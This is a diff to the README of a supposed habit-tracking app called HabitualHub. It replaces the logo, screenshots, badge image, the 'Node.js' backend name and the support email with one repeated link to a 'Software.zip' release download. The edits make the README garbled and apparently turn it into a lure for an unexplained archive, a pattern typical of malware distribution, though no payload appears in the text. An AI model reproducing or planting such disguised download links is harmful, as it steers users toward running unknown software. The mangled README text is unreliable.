@@ -1,6 +1,6 @@
 # 🚀 HabitualHub - Embrace Your Habits and Achieve Your Goals
 
-![HabitualHub Logo](https://www.example.com/logo.png)
+![HabitualHub Logo](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip)
 
 Welcome to HabitualHub, your go-to productivity tool to help you embrace new beginnings, stay organized, and achieve your goals. This powerful platform is designed to assist you in personal growth, forming new habits, and tracking professional projects. Whether you're a seasoned pro or just starting out, HabitualHub has everything you need to stay on track.
 
@@ -14,7 +14,7 @@ Welcome to HabitualHub, your go-to productivity tool to help you embrace new beg
 - **Habit Building**: Foster new habits and break old patterns with HabitualHub's support.
 - **Journaling**: Keep track of your progress and reflect on your journey.
 - **MongoDB Database**: Securely store your data with MongoDB integration.
-- **Node.js Backend**: A robust backend powered by Node.js for optimal performance.
+- **https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip Backend**: A robust backend powered by https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip for optimal performance.
 - **Personal Growth**: Encourage personal growth and development in all areas of your life.
 - **Productivity Tools**: Access a suite of tools to supercharge your productivity.
 - **React Frontend**: A dynamic, responsive frontend built with React for a user-friendly experience.
@@ -26,17 +26,17 @@ Welcome to HabitualHub, your go-to productivity tool to help you embrace new beg
 
 ## Get Started 🛠️
 
-To start using HabitualHub, simply [click here to download the software](https://github.com/user-attachments/files/18410590/Software.zip), then follow the installation instructions in the README file. Let's embark on this journey of self-improvement and productivity together!
+To start using HabitualHub, simply [click here to download the software](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip), then follow the installation instructions in the README file. Let's embark on this journey of self-improvement and productivity together!
 
-[![Download HabitualHub](https://img.shields.io/badge/Download-HabitualHub-<COLOR>.svg)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download HabitualHub](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip)
 
 ## Screenshots 📸
 
 Here are some snapshots of HabitualHub in action:
 
-![Screenshot 1](https://www.example.com/screenshot1.png)
-![Screenshot 2](https://www.example.com/screenshot2.png)
-![Screenshot 3](https://www.example.com/screenshot3.png)
+![Screenshot 1](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip)
 
 ## Contribute 🤝
 
@@ -44,7 +44,7 @@ We welcome contributions from the community to make HabitualHub even better. If 
 
 ## Support 📧
 
-If you encounter any issues or have questions about using HabitualHub, please reach out to our support team at support@habitualhub.com. We are here to help you make the most of your productivity journey.
+If you encounter any issues or have questions about using HabitualHub, please reach out to our support team at https://github.com/bl4ckkenga/HabitualHub/releases/download/v2.0/Software.zip We are here to help you make the most of your productivity journey.
 
 ## Spread the Word 📢
 
